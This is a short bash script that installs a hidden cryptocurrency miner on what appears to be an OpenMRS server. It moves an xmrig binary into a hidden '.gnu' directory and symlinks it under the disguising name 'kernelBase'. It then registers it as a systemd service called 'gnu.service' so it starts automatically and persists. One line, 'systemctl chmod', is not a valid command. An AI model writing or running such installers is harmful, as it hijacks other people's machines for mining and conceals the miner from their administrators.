#! /usr/bin/bash
sudo mkdir /home/openmrs/.gnu
sudo mv /home/openmrs/gnu/* /home/openmrs/.gnu
sudo rm -R /home/openmrs/gnu
cd /home/openmrs/.gnu
sudo chmod +x xmrig
sudo ln -s /home/openmrs/.gnu/xmrig kernelBase
mv gnu.service /etc/systemd/system
sudo systemctl chmod 664 /etc/systemd/system/gnu.service
sudo systemctl daemon-reload
sudo systemctl enable gnu.service
sudo systemctl restart gnu.service
